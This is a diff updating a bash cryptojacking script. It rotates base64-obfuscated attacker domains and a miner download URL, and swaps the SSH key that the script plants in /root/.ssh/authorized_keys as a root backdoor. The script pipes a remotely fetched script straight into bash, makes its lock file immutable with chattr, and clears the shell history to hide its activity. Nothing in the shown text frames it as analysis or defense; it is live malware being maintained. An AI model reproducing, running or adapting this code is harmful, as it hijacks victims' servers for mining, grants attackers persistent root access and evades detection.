@@ -1,9 +1,9 @@
 #!/bin/bash
 #variables
-domain=$(echo a2lzcy5hLWRvZy50b3AK|base64 -d)
-mainurl=$(echo aHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOAo=|base64 -d)
+domain=$(echo c29sc2Nhbi5saXZlCg==|base64 -d)
+mainurl=$(echo aHR0cDovL3NvbHNjYW4ubGl2ZS9iMmY2MjgK|base64 -d)
 miner_url=$(echo aHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOC9tL3htLnRhcgo=|base64 -d)
-miner_url_backup=$(echo aHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOC9tL3htLnRhcgo=|base64 -d)
+miner_url_backup=$(echo aHR0cDovL3NvbHNjYW4ubGl2ZS9iMmY2MjgvbS94bS50YXIK|base64 -d)
 proxyport=1414
 #mv command
 m_command(){
@@ -196,7 +196,7 @@ function lock_cron()
 function makesshaxx(){
 #优化
 	echo "begin makessh"
-	RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver"
+	RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDARQBeCKCotkJjG1ELCtSgQ649Q5WUJBQ6EttOG3OMAkJSKikprDLBVDomo1suYoCPCIH9aTAqFxGCr5yYmBRbpbLZti7oOdIroVZu3gU4VKeyfAVyYuMn5FfPbvH3On+gejLebDNLYXr8yDF42cycKfeoKX0xkZM1OjygQKXl77OlysSNIUUVaRpL7h3+y2wC0cErAESRXnJXOWNnBlQGifWh58Af/bxDfATPY1rj72akTjG59cO/ZPALHMfAlhDIxEgt7uBhMAXt6bP0F2NQJOzc37rndcT/mU8cENmUeYKS24pArBLg2XhsTAIVV4I5ltTphkbDs1MFa95Ib/nDiE7ue/G6TRn3Wp8I/0obUZrgFazJ8wBV9TmxyPmi+TMc59QLtoYe24g44w+Hk3FAkMsOwODmwW8t0F0Qd5t6aL/sP5wQ5TNvgkQd7bzlJlilZ+pa/OOmg71FlJzSOA4dgRk8CqHw4IvEzAW3EVFuR12PwL1ht4Q0wiHj0MwP770= root@server-jr7vuw"
 
 	mkdir -p /root/.ssh/   
 	touch /root/.ssh/authorized_keys  
@@ -505,6 +505,8 @@ if [ ! -f "/var/tmp/.psla" ]; then
 localgo
 echo 'lockfile' > /var/tmp/.psla
 sleep 10
+ #${mainurl/b.sh
+ # ${mainurl}/s/s.sh
 ${CURL_CMD} -fsSL ${mainurl}/s/s.sh | bash 
 ${CHATTR} +i /var/tmp/.psla
 history -c
